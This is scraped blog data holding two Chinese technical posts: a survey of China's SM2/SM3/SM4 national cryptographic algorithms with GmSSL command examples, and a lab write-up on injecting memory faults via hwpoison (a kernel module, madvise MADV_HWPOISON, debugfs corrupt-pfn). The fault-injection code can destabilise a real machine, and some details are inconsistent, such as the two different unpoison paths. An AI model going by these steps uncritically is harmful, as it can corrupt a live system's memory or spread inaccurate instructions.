SM2、SM9等属于公钥密码(非对称加密) SM3属于单向散列函数。 目前我国主要使用公开的SM2、SM3、SM4作为商用密码算法。\n其中SM1、SM7算法不公开，调用该算法时，需要通过加密芯片的接口进行调用\nSM2是基于椭圆曲线的公钥密码算法，包括用于数字签名的SM2-1、用于密钥交换的SM2-2和用于公钥密码的SM2-3。 SM3是能够计算出256比特的散列值的单向散列函数，主要用于数字签名和消息认证码。 SM4是属于对称密码的一种分组密码算法，分组长度和密钥长度均为128比特。 国密算法从SM1-SM4分别实现了对称、非对称、摘要等算法功能，目前已普遍应用于日常工作生活中的各个方面，如工作中使用的VPN，金融业务中的资金流转、刷卡支付，以及门禁设施、身份认证等。\nSM1 SM1算法是分组密码算法，分组长度为128位，密钥长度都为128比特，算法安全保密强度及相关软硬件实现性能与AES相当，算法不公开，仅以IP核的形式存在于芯片中。\n采用该算法已经研制了系列芯片、智能IC卡、智能密码钥匙、加密卡、加密机等安全产品，广泛应用于电子政务、电子商务及国民经济的各个应用领域（包括国家政务通、警务通等重要领域）。\nSM2 可以理解为国产RSA。非对称加密，基于ECC。该算法已公开。由于该算法基于ECC，故其签名速度与秘钥生成速度都快于RSA。\nSM2椭圆曲线公钥密码算法是我国自主设计的公钥密码算法，包括SM2-1椭圆曲线数字签名算法，SM2-2椭圆曲线密钥交换协议，SM2-3椭圆曲线公钥加密算法，分别用于实现数字签名密钥协商和数据加密等功能。SM2算法与RSA算法不同的是，SM2算法是基于椭圆曲线上点群离散对数难题，相对于RSA算法，256位的SM2密码强度已经比2048位的RSA密码强度要高，但运算速度快于RSA。\nSM3 可以理解为国产MD5。消息摘要。可以用MD5作为对比理解。该算法已公开。校验结果为256位。\nSM4 可以理解为国产AES。无线局域网标准的分组数据算法。对称加密，密钥长度和分组长度均为128位。\nSM9 一种标识密码(IBE)算法，由国家密码管理局于2016年3月28日发布，相关标准为“GM/T0044-2016SM9标识密码算法”。主要用于用户的身份认证。SM9的加密强度等同于3072位密钥的RSA加密算法。\n使用经验 一般数据发送端都是用SM4对数据内容加密，使用SM3对内容进行摘要，再使用SM2对摘要进行签名。\n一般接收端，先用SM2对摘要进行验签，验签成功后就做到了防抵赖，对发送过来的内容进行SM3摘要，看下生成的摘要和验签后的摘要是否一致，用于防篡改。\n另外SM4在加密解密需要相同的密钥，这个我们可以通过编写密钥交换模块实现生成相同的密钥。用于SM4对称加密。\n关于非对称还要注意几点：\n（1）公钥是通过私钥产生的；\n（2）公钥加密，私钥解密是加密的过程\n（3）私钥加密，公钥解密是签名的过程；\n由于SM1、SM4加解密的分组大小为128bit，故对消息进行加解密时，若消息长度过长，需要进行分组，要消息长度不足，则要进行填充。\n国密算法的安全性 国密算法，作为国家层面推广的密码算法标准，其安全性经过了严格的审查和评估。\n以下是对SM2、SM3和SM4算法安全性的进一步分析：\nSM2算法的安全性 SM2算法是一个基于椭圆曲线的公钥密码算法，其安全性主要依赖于椭圆曲线离散对数问题的难度。与RSA算法相比，SM2算法在相同的安全强度下，所需的密钥长度更短，因此，在加密和签名速度上具有一定的优势。此外，SM2算法在设计时也考虑了多种攻击手段，并采用了相应的防护措施，从而确保了其在实际应用中的安全性。\nSM3算法的安全性 SM3算法是一个密码杂凑算法，主要用于数字签名和消息认证等场景。其安全性主要体现在以下几个方面：\n输出长度：SM3算法的输出长度为256比特，相比MD5（128比特）和SHA-1（160比特）算法，其输出长度更长，因此具有更高的安全性。 碰撞攻击：SM3算法在设计时考虑了碰撞攻击的问题，并采用了相应的防护措施。目前，尚未有公开的针对SM3算法的碰撞攻击方法。 雪崩效应：SM3算法具有雪崩效应，即输入数据的微小变化会导致输出结果的巨大差异。这一特性使得攻击者难以通过猜测或穷举的方式来破解SM3算法。 SM4算法的安全性 SM4算法是一个分组密码算法，主要用于数据的加密和解密。其安全性主要体现在以下几个方面：\n密钥长度：SM4算法的密钥长度为128比特，与AES算法相同。这一长度的密钥足以抵抗目前已知的所有密码攻击方法。 分组长度：SM4算法的分组长度也为128比特，这意味着每次加密或解密的数据块大小为128比特。这一分组长度可以确保数据的机密性和完整性。 加密轮数：SM4算法采用了多轮加密的方式，每轮加密都使用了不同的密钥和加密函数。这种加密方式可以使得攻击者难以通过分析加密过程来破解算法。 安全性评估：SM4算法已经经过了多轮的安全性评估和审查，其安全性得到了广泛的认可。目前，尚未有公开的针对SM4算法的有效攻击方法。 综上所述，国密算法中的SM2、SM3和SM4算法都具有较高的安全性，可以满足不同场景下的密码应用需求。在实际应用中，可以根据具体的需求和场景选择合适的算法进行使用。\n实验过程 本实验使用北京大学自主开发的国产商用密码开源库GmSSL，这个库实现了对国密算法、标准和安全通信协议的全面功能覆盖，支持包括移动端在内的主流操作系统和处理器，支持密码钥匙、密码卡等典型国产密码硬件，提供功能丰富的命令行工具及多种编译语言编程接口。\n下载 GmSSL的主分支版本为 GmSSL-3.1.1，主要增加跨平台特性，特别是对Windows/Visual Studio的支持，Windows、Android、iOS平台的开发者需要使用该版本。 1 git clone https://github.com/guanzhi/GmSSL.git 编译与安装 1 2 3 4 5 6 mkdir build cd build cmake .. make make test sudo make install 安装gmssl-python\n1 pip install gmssl-python 验证安装成功\n注意gmssl-python包中只包含一个gmssl模块（而不是gmssl_python模块）。\n可以在Python交互环境中做简单的测试\n1 2 3 \u0026gt;\u0026gt;\u0026gt; import gmssl \u0026gt;\u0026gt;\u0026gt; gmssl.GMSSL_PYTHON_VERSION \u0026gt;\u0026gt;\u0026gt; gmssl.GMSSL_LIBRARY_VERSION gmssl基本指令 SM4加密解密 环境变量\nKEY：加密和解密使用的密钥，长度为16字节（128位）。\nIV：初始化向量，用于某些加密模式（如 CBC 和 CTR），长度为16字节（128位）。\n1 2 root@ecs-5123:~# KEY=11223344556677881122334455667788 root@ecs-5123:~# IV=11223344556677881122334455667788 使用 CBC 模式加密\n1 root@ecs-5123:~# echo hello | gmssl sm4_cbc -encrypt -key $KEY -iv $IV -out sm4.cbc 使用 CBC 模式解密\n1 2 root@ecs-5123:~# gmssl sm4_cbc -decrypt -key $KEY -iv $IV -in sm4.cbc hello 使用 CTR 模式加密\n1 root@ecs-5123:~# echo hello | gmssl sm4_ctr -encrypt -key $KEY -iv $IV -out sm4.ctr 使用 CTR 模式解密\n1 2 root@ecs-5123:~# gmssl sm4_ctr -decrypt -key $KEY -iv $IV -in sm4.ctr hello SM3摘要 计算 SM3 哈希值\n1 2 root@ecs-5123:~# echo -n abc | gmssl sm3 66c7f0f462eeedd9d1f2d46bdc10e4e24167c4875cf2f7a2297da02b8f4ba8e0 生成 SM2 密钥对\ngmssl sm2keygen：生成一个 SM2 密钥对。\n-pass 1234：指定用于加密私钥的密码为 1234。 -out sm2.pem：将生成的私钥保存到 sm2.pem 文件中。 -pubout sm2pub.pem：将生成的公钥保存到 sm2pub.pem 文件中。 1 root@ecs-5123:~# gmssl sm2keygen -pass 1234 -out sm2.pem -pubout sm2pub.pem 使用公钥和 ID 计算 SM3 哈希值\necho -n abc：输出字符串 abc。\n| gmssl sm3 -pubkey sm2pub.pem -id 1234567812345678：将字符串 abc 通过管道传输给 gmssl 工具。\nsm3：指定使用 SM3 哈希算法。 -pubkey sm2pub.pem：使用 sm2pub.pem 文件中的 SM2 公钥。 -id 1234567812345678：指定 ID（用户标识），在某些加密操作中用于唯一标识用户。 1 2 root@ecs-5123:~# echo -n | gmssl sm3 -pubkey sm2pub.pem -id 1234567812345678 59cf08de46459c87ee8f5f114b09a9fb10900133ad7ceb0cb181c1b617d088e6 使用 HMAC-SM3 进行哈希计算\necho -n abc：输出字符串 abc。\n| gmssl sm3hmac -key 11223344556677881122334455667788：将字符串 abc 通过管道传输给 gmssl 工具。\nsm3hmac：指定使用 HMAC-SM3 算法。 -key 11223344556677881122334455667788：指定用于 HMAC 的密钥，长度为 16 字节（128 位）。 1 2 root@ecs-5123:~# echo -n eab |gmssl sm3hmac -key 11223344556677881122334455667788 a6d4a86e315a097a8981d9943ddf6a5144b1b4e8052ab3eb9534e0b4b0752cf0 SM2签名及验签 生成密钥对\ngmssl sm2keygen: 使用 GMSSL 工具生成 SM2 密钥对。\n-pass 1234: 指定密钥对加密时使用的密码（1234）。\n-out sm2.pem: 将生成的私钥保存到 sm2.pem 文件中。\n-pubout sm2pub.pem: 将生成的公钥保存到 sm2pub.pem 文件中。\n1 hacker@LAPTOP-V47UU71B:~$ gmssl sm2keygen -pass 1234 -out sm2.pem -pubout sm2pub.pem 对消息进行签名\necho hello: 输出 \u0026ldquo;hello\u0026rdquo; 字符串。\n|: 管道符，将前一个命令的输出作为下一个命令的输入。\ngmssl sm2sign: 使用 GMSSL 工具对输入消息进行签名。\n-key sm2.pem: 指定用于签名的私钥文件 sm2.pem。\n-pass 1234: 私钥文件的密码。\n-out sm2.sig: 将签名结果保存到 sm2.sig 文件中。\n#-id 1234567812345678: （注释掉的）用户 ID（可选项）。\n1 hacker@LAPTOP-V47UU71B:~$ echo hello | gmssl sm2sign -key sm2.pem -pass 1234 -out sm2.sig 验证签名\necho hello: 输出 \u0026ldquo;hello\u0026rdquo; 字符串。\n|: 管道符，将前一个命令的输出作为下一个命令的输入。\ngmssl sm2verify: 使用 GMSSL 工具验证签名。\n-pubkey sm2pub.pem: 指定用于验证签名的公钥文件 sm2pub.pem。\n-sig sm2.sig: 指定要验证的签名文件 sm2.sig。\n-id 1234567812345678: 用户 ID（与签名时使用的 ID 一致）。\n1 2 3 4 5 6 hacker@LAPTOP-V47UU71B:~$ echo hello |gmssl sm2verify -pubkey sm2pub.pem -sig sm2.sig -id 123467812345678 /home/hacker/secret_test/GmSSL/src/sm2_sign.c:265:sm2_fast_verify(): /home/hacker/secret_test/GmSSL/src/sm2_sign.c:671:sm2_verify_finish(): gmssl sm2verify: inner error hacker@LAPTOP-V47UU71B:~$ echo hello |gmssl sm2verify -pubkey sm2pub.pem -sig sm2.sig verify : success SM2加密及解密 加密消息\necho hello: 输出 \u0026ldquo;hello\u0026rdquo; 字符串。\n|: 管道符，将前一个命令的输出作为下一个命令的输入。\ngmssl sm2encrypt: 使用 GMSSL 工具加密输入消息。\n-pubkey sm2pub.pem: 指定用于加密的公钥文件 sm2pub.pem。\n-out sm2.der: 将加密结果保存到 sm2.der 文件中。\n1 hacker@LAPTOP-V47UU71B:~$ echo hello | gmssl sm2encrypt -pubkey sm2pub.pem -out sm2.der 解密消息\ngmssl sm2decrypt: 使用 GMSSL 工具解密消息。\n-key sm2.pem: 指定用于解密的私钥文件 sm2.pem。\n-pass 1234: 私钥文件的密码。\n-in sm2.der: 指定要解密的加密文件 sm2.der。\n1 2 hacker@LAPTOP-V47UU71B:~$ gmssl sm2decrypt -key sm2.pem -pass 1234 -in sm2.der hello 生成SM2根证书rootcakey.pem及CA证书cakey.pem 生成根 CA 密钥对\ngmssl sm2keygen: 使用 GMSSL 工具生成 SM2 密钥对。\n-pass 1234: 指定密钥加密时使用的密码（1234）。\n-out rootcakey.pem: 将生成的私钥保存到 rootcakey.pem 文件中。\n1 2 3 4 hacker@LAPTOP-V47UU71B:~$ gmssl sm2keygen -pass 1234 -out rootcakey.pem -----BEGIN PUBLIC KEY----- MFkwEwYHKoZIzj0CAQYIKoEcz1UBgi0DQgAEpy9tv+rCp6t1aEgFHaDuI30rSKh5 737ZVu0ReHqVyhqtXo2bGVIoTsR+daHXo4yO2mxxh9lTR8cBalUfBKKH5A== 生成根 CA 证书\ngmssl certgen: 使用 GMSSL 工具生成证书。\n-C CN: 指定国家代码为中国。\n-ST Beijing: 指定省/市为北京。\n-L Haidian: 指定地区为海淀区。\n-O PKU: 指定组织名为 PKU（北京大学）。\n-OU CS: 指定组织单位为 CS（计算机科学）。\n-CN ROOTCA: 指定通用名为 ROOTCA。\n-days 3650: 证书有效期为3650天（约10年）。\n-key rootcakey.pem: 使用 rootcakey.pem 文件中的私钥。\n-pass 1234: 私钥文件的密码。\n-out rootcacert.pem: 将生成的证书保存到 rootcacert.pem 文件中。\n-key_usage keyCertSign: 指定密钥用法为证书签名。\n-key_usage cRLSign: 指定密钥用法为 CRL（证书吊销列表）签名。\n1 hacker@LAPTOP-V47UU71B:~$ gmssl certgen -C CN -ST Beijing -L Haidian -O PKU -OU CS -CN ROOTCA -days 3650 -key rootcakey.pem -pass 1234 -out rootcacert.pem -key_usage cRLSign 解析根 CA 证书\ngmssl certparse: 使用 GMSSL 工具解析证书。\n-in rootcacert.pem: 指定要解析的证书文件 rootcacert.pem。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 hacker@LAPTOP-V47UU71B:~$ gmssl certparse -in rootcacert.pem Certificate tbsCertificate version: v3 (2) serialNumber: 61AF7B8350DC52B74CC1F44E signature algorithm: sm2sign-with-sm3 issuer countryName: CN stateOrProvinceName: Beijing localityName: Haidian organizationName: PKU organizationalUnitName: CS commonName: ROOTCA validity notBefore: Fri Jul 12 23:25:33 2024 notAfter: Mon Jul 10 23:25:33 2034 subject countryName: CN stateOrProvinceName: Beijing localityName: Haidian organizationName: PKU organizationalUnitName: CS commonName: ROOTCA subjectPulbicKeyInfo algorithm algorithm: ecPublicKey namedCurve: sm2p256v1 subjectPublicKey ECPoint: 04A72F6DBFEAC2A7AB756848051DA0EE237D2B48A879EF7ED956ED11787A95CA1AAD5E8D9B1952284EC47E75A1D7A38C8EDA6C7187D95347C7016A551F04A287E4 extensions Extension extnID: KeyUsage (2.5.29.15) critical: true KeyUsage: cRLSign signatureAlgorithm algorithm: sm2sign-with-sm3 signatureValue: 3045022100E8927FD23F8B92EDE9ABA2F2664F8A814B82C4A5AC1637ED1AE325FEF5705A01022054750BE9E20D7FF2707DBF59A3BAFCD2D2B0D21703C215659335209B8F5365DF -----BEGIN CERTIFICATE----- MIIBxjCCAWygAwIBAgIMYa97g1DcUrdMwfROMAoGCCqBHM9VAYN1MF0xCzAJBgNV BAYTAkNOMRAwDgYDVQQIEwdCZWlqaW5nMRAwDgYDVQQHEwdIYWlkaWFuMQwwCgYD VQQKEwNQS1UxCzAJBgNVBAsTAkNTMQ8wDQYDVQQDEwZST09UQ0EwHhcNMjQwNzEy MTUyNTMzWhcNMzQwNzEwMTUyNTMzWjBdMQswCQYDVQQGEwJDTjEQMA4GA1UECBMH QmVpamluZzEQMA4GA1UEBxMHSGFpZGlhbjEMMAoGA1UEChMDUEtVMQswCQYDVQQL EwJDUzEPMA0GA1UEAxMGUk9PVENBMFkwEwYHKoZIzj0CAQYIKoEcz1UBgi0DQgAE py9tv+rCp6t1aEgFHaDuI30rSKh5737ZVu0ReHqVyhqtXo2bGVIoTsR+daHXo4yO 2mxxh9lTR8cBalUfBKKH5KMSMBAwDgYDVR0PAQH/BAQDAgECMAoGCCqBHM9VAYN1 A0gAMEUCIQDokn/SP4uS7emrovJmT4qBS4LEpawWN+0a4yX+9XBaAQIgVHUL6eIN f/Jwfb9Zo7r80tKw0hcDwhVlkzUgm49TZd8= -----END CERTIFICATE----- 生成子 CA 密钥对\ngmssl sm2keygen: 使用 GMSSL 工具生成 SM2 密钥对。\n-pass 1234: 指定密钥加密时使用的密码（1234）。\n-out cakey.pem: 将生成的私钥保存到 cakey.pem 文件中。\n1 2 3 4 5 hacker@LAPTOP-V47UU71B:~$ gmssl sm2keygen -pass 1234 -out cakey.pem -----BEGIN PUBLIC KEY----- MFkwEwYHKoZIzj0CAQYIKoEcz1UBgi0DQgAEe/KYB6V6WoHvlfLr8k859ZgQeZVW Dgc7flWYxo8OyRTAOT1jr9NRdt4e7kS0nMzWYJGZfqGVeapIfuwWv8fZvA== -----END PUBLIC KEY----- 生成子 CA 证书请求\ngmssl reqgen: 使用 GMSSL 工具生成证书请求。\n-C CN: 指定国家代码为中国。\n-ST Beijing: 指定省/市为北京。\n-L Haidian: 指定地区为海淀区。\n-O PKU: 指定组织名为 PKU（北京大学）。\n-OU CS: 指定组织单位为 CS（计算机科学）。\n-CN \u0026quot;Sub CA\u0026quot;: 指定通用名为 \u0026ldquo;Sub CA\u0026rdquo;。\n-key cakey.pem: 使用 cakey.pem 文件中的私钥。\n-pass 1234: 私钥文件的密码。\n-out careq.pem: 将生成的证书请求保存到 careq.pem 文件中。\n1 hacker@LAPTOP-V47UU71B:~$ gmssl reqgen -C CN -ST Beijing -L Haidian -O PKU -OU CS -CN \u0026#34;Sub CA\u0026#34; -key cakey.pem -pass 1234 -out careq.pem 签署子 CA 证书请求\ngmssl reqsign: 使用 GMSSL 工具签署证书请求。\n-in careq.pem: 指定要签署的证书请求文件 careq.pem。\n-days 365: 生成的子 CA 证书有效期为365天。\n-key_usage keyCertSign: 指定密钥用法为证书签名。\n-path_len_constraint 0: 限制路径长度为0，即此子 CA 不能再签发子证书。\n-cacert rootcacert.pem: 使用 rootcacert.pem 文件中的根 CA 证书。\n-key rootcakey.pem: 使用 rootcakey.pem 文件中的根 CA 私钥。\n-pass 1234: 根 CA 私钥文件的密码。\n-out cacert.pem: 将生成的子 CA 证书保存到 cacert.pem 文件中。\n1 hacker@LAPTOP-V47UU71B:~$ gmssl reqsign -in careq.pem -days 365 -key_usage keyCertSign -path_len_constraint 0 -cacert rootcacert.pem -key rootcakey.pem -pass 1234 -out cacert.pem gmssl-python测试 sm3算法\n1 2 3 4 5 6 from gmssl import * sm3 = Sm3() sm3.update(b\u0026#39;abc\u0026#39;) dgst = sm3.digest() print(\u0026#34;sm3(\u0026#39;abc\u0026#39;) : \u0026#34; + dgst.hex()) 参考文献 通俗易懂的对称加密与非对称加密原理浅析(csdn.net)\nPKI-一文读懂SM1、SM2、SM3、SM4等国密算法-腾讯云开发者社区-腾讯云(tencent.com)\nReleases · GmSSL/GmSSL-Python (github.com)\n快速上手 (gmssl.org)\nguanzhi/GmSSL: 支持国密SM2/SM3/SM4/SM9/SSL的密码工具箱 (github.com)\n","date":"2024-07-20T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%B0%83%E7%A0%94/1_hu16658318772407405148.jpg","permalink":"https://chenyuan1125.github.io/p/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%B0%83%E7%A0%94/","title":"加密算法调研"},{"content":"内存故障检测和处理 实验内容：\n模拟内存硬件错误，在x86上验证hwpoison“内存毒化”功能和EDAC（Error Detection And Correction）的检错和纠错功能 使用Rasdaemon捕获错误位置，并在操作系统级别完成错误内存的软下线 评分标准（折算为百分制）\n（20分）在X86平台上模拟内存错误 （内存故障 injection） （20分）在X86平台上捕获内存错误的日志信息 （20分）在X86平台上验证EDAC的检测和纠错功能 （30分）在X86平台上根据捕获的内存错误信息，完成对应内存页或多个临近内存页的软下线 （10分）书面\u0026amp;口头实验报告 平台不限，选择其一，调研edac在不同硬件暴露的信息类别和量级都不一样（接口），找出内存出错位置，做内存隔离，Linux有一套完整的内存隔离机制\n实验环境 采用VMware虚拟机\n操作系统：ubuntu 20.04\n内核版本：5.15.0\nhwpoison hwpoison 是 Linux 内核中的一种机制，用于处理硬件内存错误。其主要功能是检测并隔离有缺陷的内存页，以防止这些缺陷对系统稳定性和数据完整性产生负面影响。\n具体功能和工作原理 检测硬件错误：hwpoison 依赖于硬件错误检测机制，例如 ECC（错误校正码）内存或现代 CPU 的内存控制器。这些硬件组件能够检测内存错误，如位翻转等。 报告和标记错误页面：当硬件检测到内存错误时，会向操作系统报告。Linux 内核中的 hwpoison 机制会收到这些报告，并标记受影响的内存页为“损坏”（poisoned）。 隔离损坏页面：标记为损坏的内存页将被隔离，不再被系统使用。对于正在使用的页面，内核会尝试将其内容迁移到健康的内存区域，并确保应用程序能够继续运行而不会读取到损坏的数据。 通知用户空间应用：内核还可以通过信号机制（如 SIGBUS）通知用户空间应用程序，让它们可以采取相应的措施，如保存工作状态或尝试恢复数据。 hwpoison 的工作流程 错误检测：内存控制器（Memory Controller）检测到内存错误，并生成错误报告。 错误报告处理：错误报告通过机器检查异常（MCE，Machine Check Exception）或其他硬件机制传递给操作系统内核。 标记有毒页: hwpoison模块接收到错误报告后，将出错的内存页标记为有毒，具体操作包括： 从页表中移除该页。 将该页添加到内存故障隔离列表中。 内存隔离：有毒页不再被分配给任何进程或用于内核分配，确保系统不再使用出错的内存。 错误记录与通知：错误信息被记录在系统日志中，并通知用户态应用程序进行进一步处理。 使用场景 hwpoison 主要用于以下几种场景：\n服务器环境：在高可靠性要求的服务器中，hwpoison 可以帮助检测和隔离内存硬件错误，确保服务器的长期稳定运行。 数据中心：对于数据中心中的大规模服务器集群，hwpoison 有助于维护整个系统的稳定性和数据完整性。 关键任务应用：在一些对稳定性要求极高的关键任务应用中，如金融系统、航空控制系统等，hwpoison 能提供额外的一层保护。 内核参数和配置 在实际应用中，可以通过以下命令和参数来配置和使用 hwpoison：\n检查内核模块 某些功能可能需要加载特定的内核模块。你可以尝试加载相关模块：\n1 sudo modprobe hwpoison-inject 检查模块是否加载成功：\n1 lsmod | grep hwpoison 你的内核配置已经启用了 CONFIG_MEMORY_FAILURE 和 CONFIG_DEBUG_FS。但是，如果你仍然找不到 /sys/kernel/debug/hwpoison/corrupt-pfn，请按照以下步骤检查和解决问题。\n检查 hwpoison 子目录 挂载 DebugFS 后，检查是否存在 hwpoison 子目录：\n1 ls /sys/kernel/debug/hwpoison 你应该看到类似 corrupt-pfn 的文件。如果没有，可能是内核版本或配置问题。\n检查内核日志 如果 hwpoison 目录仍然不存在，检查内核日志，看看是否有相关信息：\n1 dmesg | grep hwpoison 验证内存毒化功能 一般来说，用户态程序导致的页错误（如访问无效内存地址）会触发 SIGSEGV 信号，而不是直接导致内核对该页面进行内存毒化。内存毒化通常是为了处理硬件内存错误，而不是普通的页错误。\n为了验证内存毒化功能，还是需要通过特定方法制造可以被内核识别并处理的内存错误，以下是制作内存错误的一些方法。\n内存错误注入 1、使用内核模块强制制造内存错误。编写一个内核模块，强制将某个物理页面标记为硬件毒化。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/mm.h\u0026gt; static unsigned long pfn = 0; module_param(pfn, ulong, 0); MODULE_PARM_DESC(pfn, \u0026#34;Page Frame Number\u0026#34;); static int __init hwpoison_test_init(void) { pr_info(\u0026#34;Injecting hwpoison to PFN: %lx\\n\u0026#34;, pfn); if (memory_failure(pfn, 0)) pr_err(\u0026#34;Failed to inject hwpoison to PFN: %lx\\n\u0026#34;, pfn); else pr_info(\u0026#34;Successfully injected hwpoison to PFN: %lx\\n\u0026#34;, pfn); return 0; } static void __exit hwpoison_test_exit(void) { pr_info(\u0026#34;hwpoison_test module exited\\n\u0026#34;); } module_init(hwpoison_test_init); module_exit(hwpoison_test_exit); MODULE_LICENSE(\u0026#34;GPL\u0026#34;); MODULE_DESCRIPTION(\u0026#34;HWPoison Test Module\u0026#34;); MODULE_AUTHOR(\u0026#34;Lijun\u0026#34;); 保存代码为 hwpoison_test.c。\n创建一个 Makefile：\n1 2 3 4 5 6 7 obj-m += hwpoison_test.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean 编译内核模块：\n1 make 加载内核模块，并传递一个有效的 PFN（Page Frame Number）。可以通过之前获取物理页框号的方法获取有效的 PFN：\n1 sudo insmod hwpoison_test.ko pfn=0x12345 2、使用 madvise 触发内存错误\n在用户空间，使用 madvise 系统调用可以请求内核对内存页执行特定的操作，例如毒化内存页。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #define PAGE_SIZE 4096 void trigger_hwpoison(void *addr) { if (madvise(addr, PAGE_SIZE, MADV_HWPOISON) != 0) { perror(\u0026#34;madvise\u0026#34;); } else { printf(\u0026#34;Memory poisoning triggered at address %p\\n\u0026#34;, addr); } } int main() { void *addr; addr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); if (addr == MAP_FAILED) { perror(\u0026#34;mmap\u0026#34;); return 1; } printf(\u0026#34;Allocated memory at address %p\\n\u0026#34;, addr); // Fill the allocated memory with some data memset(addr, 0xAA, PAGE_SIZE); // Trigger memory poisoning trigger_hwpoison(addr); // Access the poisoned memory to cause a fault printf(\u0026#34;Accessing poisoned memory at address %p\\n\u0026#34;, addr); *((char *)addr) = 0xBB; // Cleanup munmap(addr, PAGE_SIZE); return 0; } 3、编写和运行 C 程序获取物理页框号，再使用命令注入内存错误\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define PAGE_SHIFT 12 #define PAGE_SIZE (1UL \u0026lt;\u0026lt; PAGE_SHIFT) int main() { unsigned long virt_addr = 0; unsigned long page_addr; unsigned long page_offset; unsigned long *ptr; int fd; uint64_t page_entry; ptr = malloc(PAGE_SIZE); if (!ptr) { perror(\u0026#34;malloc\u0026#34;); return 1; } virt_addr = (unsigned long)ptr; fd = open(\u0026#34;/proc/self/pagemap\u0026#34;, O_RDONLY); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (lseek(fd, (virt_addr \u0026gt;\u0026gt; PAGE_SHIFT) * sizeof(uint64_t), SEEK_SET) \u0026lt; 0) { perror(\u0026#34;lseek\u0026#34;); return 1; } if (read(fd, \u0026amp;page_entry, sizeof(uint64_t)) \u0026lt; 0) { perror(\u0026#34;read\u0026#34;); return 1; } close(fd); if (!(page_entry \u0026amp; (1ULL \u0026lt;\u0026lt; 63))) { fprintf(stderr, \u0026#34;Page not present\\n\u0026#34;); return 1; } page_addr = (page_entry \u0026amp; ((1ULL \u0026lt;\u0026lt; 55) - 1)) \u0026lt;\u0026lt; PAGE_SHIFT; page_offset = virt_addr \u0026amp; (PAGE_SIZE - 1); unsigned long pfn = page_addr \u0026gt;\u0026gt; PAGE_SHIFT; printf(\u0026#34;Virtual address: 0x%lx\\n\u0026#34;, virt_addr); printf(\u0026#34;Physical page frame number: 0x%lx\\n\u0026#34;, pfn); free(ptr); return 0; } 编译并运行该程序：\n1 2 gcc -o get_pfn get_pfn.c ./get_pfn 该程序将输出虚拟地址和物理页框号:\n1 2 Virtual address: 0x55556e3ac2a0 Physical page frame number: 0x0 使用获取到的物理页框号注入内存错误：\n1 2 3 hacker@ubuntu:~/Desktop$ echo 0x0 | sudo tee /sys/kernel/debug/hwpoison/corrupt-pfn 0x0 tee: /sys/kernel/debug/hwpoison/corrupt-pfn: Memory page has hardware error 4、直接使用命令注入\n1 2 3 4 5 6 # 将物理地址转换为页帧号 (PFN) physical_address=0x12345678 pfn=$(($physical_address \u0026gt;\u0026gt; 12)) # 注入 hwpoison echo $pfn | sudo tee /sys/kernel/debug/hwpoison/corrupt-pfn 验证内存毒化功能 检查内核日志以确认内存错误已被检测和处理：\n1 2 3 4 [ 2481.576496] Injecting memory failure at pfn 0x0 [ 2481.576516] Memory failure: 0x0: already hardware poisoned [ 2392.437856] Injecting memory failure at pfn 0x12345 [ 2392.439018] Memory failure: 0x12345: recovery action for clean LRU page: Recovered 总的来说，hwpoison 是一个用于提高系统稳定性和可靠性的关键机制，特别是在需要处理硬件内存错误的环境中。\n恢复内存毒化页面 1、使用 echo写入 /sys/kernel/debug/hwpoison/unpoison-pfn\n在PFN的Software-unpoison页面对应到这个文件。这样，一个页面可以再次被复用。这只对Linux注入的故障起作用，对真正的内存故障不起作用。 1 echo 0x12345 \u0026gt; /sys/kernel/mm/page_poison/unpoison-pfn 2、使用madvice系统调用\nmadvise 系统调用可用于通知内核某些内存页面的期望使用方式，但不能直接解除 hwpoison 状态。然而，结合 madvise 和重启系统，可以间接帮助恢复内存状态。 3、或者通过内核模块恢复毒化的内存页\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/mm.h\u0026gt; #include \u0026lt;linux/page-flags.h\u0026gt; static unsigned long pfn = 0; module_param(pfn, ulong, 0); MODULE_PARM_DESC(pfn, \u0026#34;Page Frame Number to be unpoisoned\u0026#34;); static int __init unpoison_page_init(void) { struct page *page; if (pfn == 0) { pr_err(\u0026#34;Invalid PFN\\n\u0026#34;); return -EINVAL; } page = pfn_to_page(pfn); if (!page) { pr_err(\u0026#34;Invalid page\\n\u0026#34;); return -EINVAL; } pr_info(\u0026#34;Unpoisoning page at PFN: 0x%lx\\n\u0026#34;, pfn); ClearPageHWPoison(page); return 0; } static void __exit unpoison_page_exit(void) { pr_info(\u0026#34;unpoison_page module exited\\n\u0026#34;); } module_init(unpoison_page_init); module_exit(unpoison_page_exit); 